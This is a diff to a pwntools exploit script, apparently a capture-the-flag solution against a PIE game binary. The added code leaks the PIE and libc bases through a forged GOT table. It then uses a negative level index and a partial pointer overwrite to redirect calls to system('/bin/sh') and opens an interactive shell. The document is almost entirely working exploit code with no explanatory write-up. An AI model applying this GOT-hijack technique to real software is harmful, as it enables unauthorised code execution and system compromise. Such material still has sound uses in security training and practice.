@@ -2,7 +2,6 @@
 from pwn import *
 
 context.update(
-        arch="amd64",
         endian="little",
         log_level="info",
         os="linux",
@@ -57,22 +56,69 @@ def view(p, index):
     ru(p,b"")
     return rl(p)
 
-def exploit(io,e):
+def exploit(io,e,l):
     io.recvuntil(b"information: ")
     pie = int(io.recvline(), 16) - e.sym["main"]
 
+    fake_got1 = flat(
+        # 0xf900c0
+        p32(pie + e.sym["main"] + 0x1f6ac - 0x118c), p32(0), p32(0), p32(0), # GOT[puts] - main = 0x1f6ac (offset for "Thanks" string)
+        
+        # 0xf900d0
+        p32(0), p32(0), p32(0), p32(0),
+        
+        # 0xf900e0
+        p32(0), p32(pie + e.sym["main"]), p32(0), p32(0), # address for main() so exit() jumps back into main()
+        
+        # 0xf900f0
+        p32(0), p32(0), p32(0), p32(0),
+
+        # 0xf90100
+        p32(0), p32(0), p32(0), p32(pie + e.sym["main"] - 0x80), # offset from main() to puts_blue()
+
+    )
+
     print(f"[*] PIE BASE: 0x{pie:x}")
 
-    io.sendlineafter(b"game?", b"AAAAAAAAA")
+    io.sendlineafter(b"game?", fake_got1)
 
     level_idx = -12
-    io.sendlineafter(b"change?", f"{level_idx}")
+    io.sendlineafter(b"change?", f"{level_idx}".encode())
 
-    # last two bytes of global pointer, offset by 0x44 to point to game_name
-    value = 0x8000 + 0x44
-    io.sendlineafter(b"level?", f"{value}")
+    # last two bytes of global pointer, offset by 0x90 to point to game_name
+    value = 0x8000 + 0x90
+    io.sendlineafter(b"level?", f"{value}".encode())
 
-    # this calls 0x41414141
+    io.recvuntil(b'in your game')
+    io.recvline()
+    libcoff = int.from_bytes(io.recvline()[5:9], 'little') - l.sym["puts"]
+    print(f"[*] libc @ 0x{libcoff:x}")
+
+    fake_got2 = flat(
+        # 0xf900c0
+        p32(next(l.search(b'/bin/sh\0')) - 0x118c + libcoff), p32(0), p32(0), p32(0), # "/bin/sh"
+        
+        # 0xf900d0
+        p32(0), p32(0), p32(0), p32(0),
+        
+        # 0xf900e0
+        p32(0), p32(pie + e.sym["main"]), p32(0), p32(0), # address for main() so exit() jumps back into main()
+        
+        # 0xf900f0
+        p32(0), p32(0), p32(0), p32(0),
+
+        # 0xf90100
+        p32(0), p32(0), p32(0), p32(l.sym['system'] + libcoff), # system()
+    )
+
+    io.sendlineafter(b"game?", fake_got2)
+
+    level_idx = -12
+    io.sendlineafter(b"change?", f"{level_idx}".encode())
+
+    # last two bytes of global pointer, offset by 0x90 to point to game_name
+    value = 0x8000 + 0x90
+    io.sendlineafter(b"level?", f"{value}".encode())
 
     io.interactive()
     
@@ -81,7 +127,7 @@ if __name__=="__main__":
 
     p = start(file)
     e = context.binary = ELF(file)
-    #l = ELF("./libc.so.6")
+    l = ELF("./lib/libc.so")
 
-    exploit(p,e)
+    exploit(p,e,l)
 
